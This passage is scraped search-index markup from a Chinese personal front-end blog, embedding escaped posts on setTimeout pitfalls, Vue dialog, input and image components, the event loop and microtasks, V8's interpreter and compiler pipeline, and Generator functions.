&lt;h2 id=&#34;使用settimeout的一些注意事项&#34;&gt;使⽤setTimeout的⼀些注意事项&lt;/h2&gt;
&lt;h3 id=&#34;如果当前任务执行时间过久会影延迟到期定时器任务的执行&#34;&gt;如果当前任务执⾏时间过久，会影延迟到期定时器任务的执⾏&lt;/h3&gt;
&lt;p&gt;在使⽤setTimeout的时候，有很多因素会导致回调函数执⾏⽐设定的预期值要久，其中⼀个就是当前任务 执⾏时间过久从⽽导致定时器设置的任务被延后执⾏&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function bar() {
console.log(&#39;bar&#39;)
}

function foo() {
setTimeout(bar, 0);
for (let i = 0; i &amp;lt; 5000; i++) {
let i = 5+8+8+8
console.log(i)
	}
}

foo()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在执⾏foo函数的时候使⽤setTimeout设置了⼀个0延时的回调任务，设置好回调任务后，foo 函数会继续执⾏5000次for循环。&lt;/p&gt;
&lt;p&gt;通过setTimeout设置的回调任务被放⼊了消息队列中并且等待下⼀次执⾏，这⾥并不是⽴即执⾏的；要执 ⾏消息队列中的下个任务，需要等待当前的任务执⾏完成，由于当前这段代码要执⾏5000次的for循环，所 以当前这个任务的执⾏时间会⽐较久⼀点。这势必会影响到下个任务的执⾏时间。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;如果settimeout存在嵌套调用那么系统会设置最短时间间隔为4毫秒&#34;&gt;如果setTimeout存在嵌套调⽤，那么系统会设置最短时间间隔为4毫秒&lt;/h3&gt;
&lt;p&gt;也就是说在定时器函数⾥⾯嵌套调⽤定时器，也会延⻓定时器的执⾏时间&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function cb() { 
setTimeout(cb, 0); }

setTimeout(cb, 0);

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在Chrome中，定时 器被嵌套调⽤5次以上，系统会判断该函数⽅法被阻塞了，如果定时器的调⽤时间间隔⼩于4毫秒，那么浏览 器会将每次调⽤的时间间隔设置为4毫秒。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;未激活的面settimeout执行最小间隔是1000毫秒&#34;&gt;未激活的⻚⾯，setTimeout执⾏最⼩间隔是1000毫秒&lt;/h3&gt;
&lt;p&gt;未被激活的⻚⾯中定时器最⼩值⼤于1000毫 秒，也就是说，如如果标签不是当前的激活标签，那么定时器最⼩的时间间隔是1000毫秒，⽬的是为了优化 后台⻚⾯的加载损耗以及降低耗电量。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;延时执行时间有最大值&#34;&gt;延时执⾏时间有最⼤值&lt;/h3&gt;
&lt;p&gt;Chrome、 Safari、Firefox都是以32个bit来存储延时值的，32bit最⼤只能存放的数字是2147483647毫秒，这就意味 着，如果setTimeout设置的延迟值⼤于 2147483647毫秒（⼤约24.8天）时就会溢出，这导致定时器会被⽴ 即执⾏。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function showName(){
console.log(&amp;quot;极客时间&amp;quot;)
}

var timerID = setTimeout(showName,2147483648);//会被理解调⽤执⾏
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码是会⽴即被执⾏的&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;使用settimeout设置的回调函数中的this不符合直觉&#34;&gt;使⽤setTimeout设置的回调函数中的this不符合直觉&lt;/h3&gt;
&lt;p&gt;如果被setTimeout推迟执⾏的回调函数是某个对象的⽅法，那么该⽅法中的this关键字将指向全局环境，⽽ 不是定义时所在的那个对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var name= 1;

var MyObj = {
name: 2,
showName: function(){
console.log(this.name);
	}    
}

setTimeout(MyObj.showName,1000)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这⾥输出的是1，因为这段代码在编译的时候，执⾏上下⽂中的this会被设置为全局window&lt;/p&gt;
&lt;p&gt;解决方法&lt;/p&gt;
&lt;p&gt;第⼀种是将MyObj.showName放在匿名函数中执⾏&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//箭头函数
setTimeout(() =&amp;gt; {
MyObj.showName()
}, 1000);

//或者function函数
setTimeout(function() {
MyObj.showName();
}, 1000
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;第⼆种是使⽤bind⽅法，将showName绑定在MyObj上⾯&lt;/p&gt;
&lt;p&gt;&lt;code&gt;setTimeout(MyObj.showName.bind(MyObj), 1000)&lt;/code&gt;&lt;/p&gt;
"> setTimeout是如何实现的？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-kai-fa-ui-zu-jian-ri-zhi-2/"" data-c="
          &lt;h1 id=&#34;vue开发ui组件日志2&#34;&gt;Vue开发ui组件日志2&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/fanfankill/depotsystem&#34;&gt;github地址&lt;/a&gt; ,本来是个停车场实训项目，自己在上面又加了点内容 &lt;a href=&#34;https://fanfankill.github.io/post/a-li-yun-bu-shu-node-xiang-mu/&#34;&gt;介绍地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;总体&#34;&gt;总体&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629128372556.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;同时也实现了比较普通的响应式布局，配合媒体查询和flex实现。&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1629128364504.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;弹出框&#34;&gt;弹出框&lt;/h2&gt;
&lt;p&gt;这个弹出框的遮罩实现有问题，看源代码感觉是插入body里面，而我是直接插入到这个fixed的盒子上面，样式直接照搬element-ui的，vue的动画效果也直接搬运源代码，自己写的动画有点烂。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt; &amp;lt;template&amp;gt;
  &amp;lt;transition name=&amp;quot;dialog-fade&amp;quot;&amp;gt;
 
      &amp;lt;div
      class=&amp;quot;el-dialog__wrapper&amp;quot;
      v-show=&amp;quot;visible&amp;quot;
      
    &amp;gt;
      &amp;lt;div
        ref=&amp;quot;dialog&amp;quot;
        class=&amp;quot;el-dialog&amp;quot;
        :class=&amp;quot;[{ &#39;is-fullscreen&#39;: fullscreen, &#39;el-dialog--center&#39;: center }]&amp;quot;
        :style=&amp;quot;style&amp;quot;
      &amp;gt;
       &amp;lt;div class=&amp;quot;el-dialog__header&amp;quot;&amp;gt;
            &amp;lt;slot name=&amp;quot;title&amp;quot;&amp;gt;
            &amp;lt;span class=&amp;quot;el-dialog__title&amp;quot;&amp;gt;{{ title }}&amp;lt;/span&amp;gt;
          &amp;lt;/slot&amp;gt;

          &amp;lt;button
            type=&amp;quot;button&amp;quot;
            class=&amp;quot;el-dialog__headerbtn&amp;quot;
            aria-label=&amp;quot;Close&amp;quot;
            v-if=&amp;quot;showClose&amp;quot;
            @click=&amp;quot;handleClose&amp;quot;&amp;gt;
            &amp;lt;i class=&amp;quot;el-dialog__close el-icon el-icon-close&amp;quot;&amp;gt;&amp;lt;/i&amp;gt;
          &amp;lt;/button&amp;gt;
       &amp;lt;/div&amp;gt;
        &amp;lt;div class=&amp;quot;el-dialog__body&amp;quot;&amp;gt;&amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt;&amp;lt;/div&amp;gt;
          &amp;lt;div class=&amp;quot;el-dialog__footer&amp;quot;&amp;gt;&amp;lt;slot name=&amp;quot;footer&amp;quot;&amp;gt;&amp;lt;/slot&amp;gt;&amp;lt;/div&amp;gt;
      &amp;lt;/div&amp;gt;
      &amp;lt;!-- 暂时把点击事件移到遮罩上面 --&amp;gt;
      &amp;lt;div class=&amp;quot;v-modal&amp;quot;   @click.self=&amp;quot;handleWrapperClick&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
    
  &amp;lt;/transition&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script &amp;gt;
export default {
  name: &amp;quot;FanDialog&amp;quot;,

  props: {
    title: {
      type: String,
      default: &amp;quot;&amp;quot;,
    },

    // modal    是否需要遮罩层
    modal: {
      type: Boolean,
      default: true,
    },

    // close-on-press-escape    是否可以通过按下 ESC 关闭 Dialog    
      closeOnPressEscape: {
        type: Boolean,
        default: true
      },

    // close-on-click-modal    是否可以通过点击 modal 关闭 Dialog
    closeOnClickModal: {
      type: Boolean,
      default: true,
    },

    // fullscreen    是否为全屏 Dialog
    fullscreen: Boolean,

    //是否居中
    center: {
      type: Boolean,
      default: false,
    },
     //关闭前的回调，会暂停 Dialog 的关闭
      beforeClose: Function,

    // show-close    是否显示关闭按钮
    showClose: {
      type: Boolean,
      default: true,
    },

    // width    Dialog 的宽度
    width: {
        type:String,
    },
    //双向绑定
    visible: {
      type: Boolean,
      default: true,
    },

    // top    Dialog CSS 中的 margin-top 值
    top: {
      type: String,
      default: &amp;quot;15vh&amp;quot;,
    },
  },
    
  data() {
      return {
          closed: false
      }
  },
 
  watch:{
      visible(val){
          this.closed=val
          console.log(val);
  
      } 
  },

  computed: {
      style() {
        let style = {};
        if (!this.fullscreen) {
          style.marginTop = this.top;
          if (this.width) {
            style.width = this.width;
          }
        }
        return style;
      }
    },


  methods: {
    // 点击dialog自身
    handleWrapperClick() {
      //是否开启可以点击外界区域关闭
      if (!this.closeOnClickModal) return;
      this.handleClose();
    },

    // 关闭dialog
    handleClose() {
      //如果有回调函数 先执行回调函数
      if(typeof this.beforeClose==&#39;function&#39;)
      {
        this.beforeClose(this.hide())
        
      }else{
        this.hide();
      }
    },
    // 隐藏dialog
    hide() {
      
      this.$emit(&amp;quot;update:visible&amp;quot;, false);
    },
  },
  destroyed(){
      console.log(&#39;我被摧毁了&#39;);
  }
};
&amp;lt;/script &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629128352897.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;输入框&#34;&gt;输入框&lt;/h2&gt;
&lt;p&gt;挺多功能没实现，写的时候把理解且自己能够完全实现的功能先完成了&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v-model&lt;/code&gt;的组件就是&lt;code&gt;@input&lt;/code&gt;事件实现双向绑定，键入值就会触发。&lt;/p&gt;
&lt;p&gt;这个组件主要自己要知道输入框的原生事件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;template&amp;gt;
  &amp;lt;div 
  class=&amp;quot;fan_input&amp;quot;
   
  &amp;gt;
    &amp;lt;template&amp;gt;

           &amp;lt;input
       class=&amp;quot;input_defalut&amp;quot;
       ref=&amp;quot;input&amp;quot;
       :class=&amp;quot;[
       {
         &#39;is-disabled&#39;:disabled
       }
       ]&amp;quot;
       :disabled=&amp;quot;inputdisabled&amp;quot;
        v-bind=&amp;quot;$attrs&amp;quot;
        v-bind:value=&amp;quot;value&amp;quot;
        :readonly=&amp;quot;readonly&amp;quot;
        @input=&amp;quot;handleInput&amp;quot;
        @focus=&amp;quot;handleFocus&amp;quot;
        @blur=&amp;quot;handleFBlur&amp;quot;
  
      &amp;gt;


    &amp;lt;/template&amp;gt;
  
  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
export default {
  name:&#39;FanInput&#39;,

     props: {
      // value / v-model    绑定值    string / number    —
      value: [String, Number],
      disabled:Boolean,
      focused:Boolean,
      readonly:Boolean
     },

      methods: {
         // 聚焦
      focus() {
        this.getInput().focus();
      },
      // 失焦
      blur() {
        this.getInput().blur();
      },
        //双向绑定
        handleInput(e)
        {
          this.$emit(&#39;input&#39;,e.target.value)
        },
         
         //聚焦事件
         handleFocus(e){
           this.$emit(&#39;focus&#39;, e);
         },
          //失焦事件
         handleFBlur(e){
           this.$emit(&#39;blur&#39;, e);
         },


        //获取ref
        getInput()
        {
          return this.$refs.input
        }
      },

     computed:{
         // 监听原生值
      nativeInputValue() {
        return this.value === null || this.value === undefined ? &#39;&#39; : String(this.value);
      },
      //是否被禁用
      inputdisabled(){
        
        return this.disabled
      },
   
    
    }
}
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629128337680.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;标记&#34;&gt;标记&lt;/h2&gt;
&lt;p&gt;主要认识&lt;sup&gt;上标&lt;/sup&gt;&lt;code&gt;sub&lt;/code&gt;和&lt;sup&gt;下标&lt;/sup&gt;&lt;code&gt;sup&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629128325988.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;图片&#34;&gt;图片&lt;/h2&gt;
&lt;p&gt;第一次了解到css的&lt;code&gt;object-fit&lt;/code&gt;属性，对图片进行处理剪切&lt;/p&gt;
&lt;p&gt;在图片加载的时候自己定义了loading的样式&lt;/p&gt;
&lt;p&gt;对插槽理解运用也更加熟练。&lt;/p&gt;
&lt;p&gt;（侧边栏刷新没有记忆下来index值，导致没有到指定位置，本地储存可以实现，不知道有没有更好的方法）&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-vue&#34;&gt;&amp;lt;template&amp;gt;
&amp;lt;div class=&amp;quot;fan-image&amp;quot;&amp;gt;

     &amp;lt;slot v-if=&amp;quot;loading&amp;quot; name=&amp;quot;placeholder&amp;quot;&amp;gt;
      &amp;lt;i class=&amp;quot;el-icon-loading fan-loading-img&amp;quot;&amp;gt;&amp;lt;/i&amp;gt;
    &amp;lt;/slot&amp;gt;

    &amp;lt;slot v-else-if=&amp;quot;error&amp;quot; name=&#39;error&#39;&amp;gt;
        &amp;lt;div class=&amp;quot;fan-image__error&amp;quot;&amp;gt;加载失败&amp;lt;/div&amp;gt;
    &amp;lt;/slot&amp;gt;
      &amp;lt;img
  v-else
  class=&amp;quot;fan-image__inner&amp;quot;
  :src=&amp;quot;src&amp;quot;
  :alt=&amp;quot;alt&amp;quot;
  :style=&amp;quot;{ &#39;object-fit&#39;: fit }&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
export default {
    name:&#39;FanImage&#39;,

    props:{

        src:String,
        alt:String,
        fit:String,
      
},

//监听src变化
    watch:{
        src:{
            handler(val){
                this.loadImage(val);
        },
            immediate:true
    }
},

    data() {
        return {
            error:false,
            loading:false
        }
},

    methods: {
         // 加载图片
      loadImage(val) {
        // reset status
        this.loading=true
       setTimeout(()=&amp;gt;{
            this.error = false;

        const img = new Image();
        img.onload = this.handleLoad.bind(this);
        img.onerror = this.handleError.bind(this);
        img.src = val;
       },500)
      },
      // load    图片加载成功触发   
      handleLoad(e) {
        this.loading=false
        this.$emit(&#39;load&#39;, e);
      },
       // error    图片加载失败触发    
      handleError(e) {
        this.loading=false
        this.error = true;
        this.$emit(&#39;error&#39;, e);
      },
    },


   
}
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629128284362.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629128278993.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;看源码自己去写组件还是有很大的收获的，以前看vue文档会很迷糊，但现在配合组件开发会有很大的收获。&lt;/p&gt;
&lt;p&gt;现在要结合vue文档和实例一起使用，才能高效性学习。&lt;/p&gt;
">Vue开发ui组件日志2</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/xiao-xi-dui-lie-he-shi-jian-xun-huan-shi-zen-me-huo-qi-lai-de/"" data-c="
          &lt;p&gt;消息队列&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1629094248592.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;事件循环和消息队列&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629094243431.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;宏任务&#34;&gt;宏任务&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;渲染事件（如解析DOM、计算布局、绘制）&lt;/li&gt;
&lt;li&gt;⽤⼾交互事件（如⿏标点击、滚动⻚⾯、放⼤缩⼩等）&lt;/li&gt;
&lt;li&gt;JavaScript脚本执⾏事件&lt;/li&gt;
&lt;li&gt;⽹络请求完成、⽂件读写完成事件&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;消息队列中宏任务⼤致流程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先从多个消息队列中选出⼀个最⽼的任务，这个任务称为oldestTask；&lt;/li&gt;
&lt;li&gt;然后循环系统记录任务开始执⾏的时间，并把这个oldestTask设置为当前正在执⾏的任务；&lt;/li&gt;
&lt;li&gt;当任务执⾏完成之后，删除当前正在执⾏的任务，并从对应的消息队列中删除掉这个oldestTask&lt;/li&gt;
&lt;li&gt;最后统计执⾏完成的时⻓等信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;微任务&#34;&gt;微任务&lt;/h2&gt;
&lt;p&gt;第⼀种是把异步回调函数封装成⼀个宏任务，添加到消息队列尾部，当循环系统执⾏到该任务的时候执⾏回 调函数&lt;/p&gt;
&lt;p&gt;第⼆种⽅式的执⾏时机是在主函数执⾏结束之后、当前宏任务结束之前执⾏回调函数，这通常都是以微任务 形式体现的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;微任务就是⼀个需要异步执⾏的函数，执⾏时机是在主函数执⾏结束之后、当前宏任务结束之前。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当JavaScript执⾏⼀段脚本的时候，V8会为其创建⼀个全局执⾏上下⽂，在创建全局执⾏上下⽂的 同时，V8引擎也会在内部创建⼀个&lt;strong&gt;微任务队列&lt;/strong&gt;，微任务队列就是⽤来存放微任务的&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;微任务是怎么产生的&#34;&gt;微任务是怎么产⽣的？&lt;/h3&gt;
&lt;p&gt;第⼀种⽅式是使⽤MutationObserver监控某个DOM节点，然后再通过JavaScript来修改这个节点，或者为 这个节点添加、删除部分⼦节点，当DOM节点发⽣变化时，就会产⽣DOM变化记录的微任务。&lt;/p&gt;
&lt;p&gt;第⼆种⽅式是使⽤Promise，当调⽤Promise.resolve()或者Promise.reject()的时候，也会产⽣微任务。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;微任务队列是何时被执行&#34;&gt;微任务队列是何时被执⾏&lt;/h3&gt;
&lt;p&gt;在当前宏任务中的JavaScript快执⾏完成时，JavaScript引擎会检查全局执⾏上下⽂中的微任务队列，然后按照顺序执⾏队列中的 微任务&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;结论：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;微任务和宏任务是绑定的，每个宏任务在执⾏时，会创建⾃⼰的微任务队列&lt;/li&gt;
&lt;li&gt;微任务的执⾏时⻓会影响到当前宏任务的时⻓。&lt;/li&gt;
&lt;li&gt;在⼀个宏任务中，分别创建⼀个⽤于回调的宏任务和微任务，⽆论什么情况下，微任务都早于宏任务执 ⾏。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;监听dom变化方法演变&#34;&gt;监听DOM变化⽅法演变&lt;/h2&gt;
&lt;p&gt;最开始使用setTimeout或者setInterval来定时检测DOM是否有改变。这种⽅ 式简单粗暴，但是会遇到两个问题：如果时间间隔设置过⻓，DOM 变化响应不够及时；反过来如果时间间 隔设置过短，⼜会浪费很多⽆⽤的⼯作量去检查DOM，会让⻚⾯变得低效。&lt;/p&gt;
&lt;p&gt;后来采用&lt;strong&gt;观察者的设计模式&lt;/strong&gt;，当DOM 有变动时就 会⽴刻触发相应的事件，这种⽅式属于同步回调。&lt;/p&gt;
&lt;p&gt;再后来使⽤ MutationObserver，将响应函数改成异步调⽤，可以不⽤在每次DOM变化都触发异步调⽤，⽽是等多 次DOM变化后，⼀次触发异步调⽤&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过异步操作解决了同步操作的性能问题；&lt;/li&gt;
&lt;li&gt;通过微任务解决了实时性的问题。&lt;/li&gt;
&lt;/ul&gt;
">消息队列和事件循环：⻚⾯是怎么“活”起来的？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/bian-yi-qi-he-jie-shi-qi-v8-shi-ru-he-zhi-duan-javascript-dai-ma-de/"" data-c="
          &lt;h2 id=&#34;编译器和解释器&#34;&gt;编译器和解释器&lt;/h2&gt;
&lt;p&gt;机器不能直接理解我们所写的代码，所以在执⾏程序之前，需要将我们 所写的代码“翻译”成机器能读懂的机器语⾔。按语⾔的执⾏流程，可以把语⾔划分为编译型语⾔和解释型 语⾔。&lt;/p&gt;
&lt;p&gt;编译型语⾔在程序执⾏之前，需要经过编译器的编译过程，并且编译之后会直接保留机器能读懂的⼆进制⽂件（c、c++）&lt;/p&gt;
&lt;p&gt;解释型语⾔编写的程序，在每次运⾏时都需要通过解释器对程序进⾏动态解释和执⾏（js,py）&lt;/p&gt;
&lt;p&gt;编译器和解释器是如何“翻译”代码流程&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629010215188.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;v8是如何执行一段javascript代码的&#34;&gt;V8是如何执⾏⼀段JavaScript代码的&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629010210576.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;V8在执⾏过程中既有解释器Ignition，⼜有编译器TurboFan&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;生成抽象语法树ast和执行上下文&#34;&gt;⽣成抽象语法树（AST）和执⾏上下⽂&lt;/h3&gt;
&lt;p&gt;将源代码转换为抽象语法树，并⽣成&lt;strong&gt;执⾏上下⽂&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;什么是AST？&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var myName = &amp;quot;极客时间&amp;quot;
function foo(){
return 23;
}
myName = &amp;quot;geektime&amp;quot;
foo()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;⽣成的AST结构如下&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629010203992.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;AST是⾮常重要的⼀种数据结构，在很多项⽬中有着⼴泛的应⽤。其中最著名的⼀个项⽬是Babel。Babel是 ⼀个被⼴泛使⽤的代码转码器，可以将ES6代码转为ES5代码&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;⽣成AST需 要经过两个阶段。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第⼀阶段是分词（tokenize），⼜称为词法分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629010198758.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;p&gt;第⼆阶段是解析（parse），⼜称为&lt;strong&gt;语法分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将上⼀步⽣成的数据，根据语法规则转为 AST。如果源码符合语法规则，这⼀步就会顺利完成。但如果源码存在语法错误，这⼀步就会终⽌，并抛出 ⼀个“语法错误”。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;生成字节码&#34;&gt;⽣成字节码&lt;/h3&gt;
&lt;p&gt;有了AST和执⾏上下⽂后，那接下来的第⼆步，解释器Ignition就登场了，它会根据AST⽣成字节码，并解释 执⾏字节码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;字节码是介于AST和机器码之间的⼀种代码。但是与特定类型的机器码⽆关，字节码需要通过解释器将其 转换为机器码后才能执⾏。&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629010190956.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h3 id=&#34;执行代码&#34;&gt;执⾏代码&lt;/h3&gt;
&lt;p&gt;⽣成字节码之后，接下来就要进⼊执⾏阶段了&lt;/p&gt;
&lt;p&gt;在执⾏字节码的过程中，如果发 现有热点代码（HotSpot），⽐如⼀段代码被重复执⾏多次，这种就称为&lt;strong&gt;热点代码&lt;/strong&gt;，那么后台的编译器 TurboFan就会把该段热点的字节码编译为⾼效的机器码，然后当再次执⾏这段被优化的代码时，只需要执 ⾏编译后的机器码就可以了，这样就⼤⼤提升了代码的执⾏效率。&lt;/p&gt;
">编译器和解释器：V8是如何执⾏⼀段JavaScript代码的？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/generator-han-shu-de-yu-fa/"" data-c="
          &lt;h2 id=&#34;基本概念&#34;&gt;基本概念&lt;/h2&gt;
&lt;p&gt;Generator 函数是 ES6 提供的一种异步编程解决方案&lt;/p&gt;
&lt;p&gt;Generator 函数是一个状态机，封装了多个内部状态。&lt;/p&gt;
&lt;p&gt;执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数。返回的遍历器对象，可以依次遍历 Generator 函数内部的每一个状态。&lt;/p&gt;
&lt;p&gt;Generator 函数有两个特征&lt;/p&gt;
&lt;p&gt;一是&lt;code&gt;function&lt;/code&gt;关键字与函数名之间有一个星号；&lt;/p&gt;
&lt;p&gt;二是函数体内部使用&lt;code&gt;yield&lt;/code&gt;表达式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function* helloWorldGenerator() {
  yield &#39;hello&#39;;
  yield &#39;world&#39;;
  return &#39;ending&#39;;
}

var hw = helloWorldGenerator();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该函数有三个状态：hello，world 和 return 语句&lt;/p&gt;
&lt;p&gt;该函数是一个指向内部状态的指针对象&lt;/p&gt;
&lt;p&gt;调用遍历器对象的&lt;code&gt;next&lt;/code&gt;方法，使得指针移向下一个状态。也就是说，每次调用&lt;code&gt;next&lt;/code&gt;方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个&lt;code&gt;yield&lt;/code&gt;表达式（或&lt;code&gt;return&lt;/code&gt;语句）为止。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;yield&lt;/code&gt;表达式是暂停执行的标记，而&lt;code&gt;next&lt;/code&gt;方法可以恢复执行。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;hw.next()
// { value: &#39;hello&#39;, done: false }

hw.next()
// { value: &#39;world&#39;, done: false }

hw.next()
// { value: &#39;ending&#39;, done: true }

hw.next()
// { value: undefined, done: true }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后一次调用&lt;code&gt;next&lt;/code&gt;的时候，Generator函数已经执行完毕，&lt;code&gt;next&lt;/code&gt;方法返回对象的&lt;code&gt;value&lt;/code&gt;属性为&lt;code&gt;undefined&lt;/code&gt;，&lt;code&gt;done&lt;/code&gt;属性的值&lt;code&gt;true&lt;/code&gt;，表示遍历已经结束。&lt;/p&gt;
&lt;p&gt;每次调用遍历器对象的&lt;code&gt;next&lt;/code&gt;方法，就会返回一个有着&lt;code&gt;value&lt;/code&gt;和&lt;code&gt;done&lt;/code&gt;两个属性的对象。&lt;code&gt;value&lt;/code&gt;属性表示当前的内部状态的值，是&lt;code&gt;yield&lt;/code&gt;表达式后面那个表达式的值；&lt;code&gt;done&lt;/code&gt;属性是一个布尔值，表示是否遍历结束。&lt;/p&gt;
&lt;br&gt;
